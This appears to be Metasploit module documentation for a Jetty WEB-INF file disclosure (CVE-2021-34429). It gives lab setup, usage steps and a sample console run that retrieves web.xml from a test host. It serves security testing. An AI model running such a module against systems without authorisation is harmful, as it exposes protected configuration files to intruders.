## Vulnerable Application

Instructions to get the vulnerable application. If applicable, include links to the vulnerable install
files, as well as instructions on installing/configuring the environment if it is different than a
standard install. Much of this will come from the PR, and can be copy/pasted.

### CVE-2021-34429

Use the Docker image from [ColdFusionX](https://github.com/ColdFusionX/CVE-2021-34429) at
https://github.com/ColdFusionX/CVE-2021-34429/blob/main/docker-compose.yml

## Verification Steps

1. Install Jetty with an app that contains a `WEB-INF` folder
1. Start msfconsole
1. Do: `use auxiliary/gather/jetty_web_inf_disclosure`
1. Do: `set rhosts`
1. Do: `run`
1. You should get the contents of a file

## Options

### FILE

The file in the `WEB-INF` folder to retrieve. Defaults to `web.xml`

## Scenarios

### Jetty 11.0.5 from Docker

```
resource (jetty.rb)> use auxiliary/gather/jetty_web_inf_disclosure
resource (jetty.rb)> set rhosts 1.1.1.1
rhosts => 1.1.1.1
resource (jetty.rb)> set rport 8080
rport => 8080
resource (jetty.rb)> set verbose true
verbose => true
resource (jetty.rb)> run
[*] Running module against 1.1.1.1
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Found version: 11.0.5
[+] 11.0.5 vulnerable to CVE-2021-34429
[!] The service is running, but could not be validated.
[+] File stored to /home/h00die/.msf4/loot/20211108134054_default_1.1.1.1_jetty.web.xml_813220.xml
[+] <!DOCTYPE web-app PUBLIC
 "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
 "http://java.sun.com/dtd/web-app_2_3.dtd" >
<web-app>
<display-name>ColdFusionX - Web Application</display-name>
</web-app>
```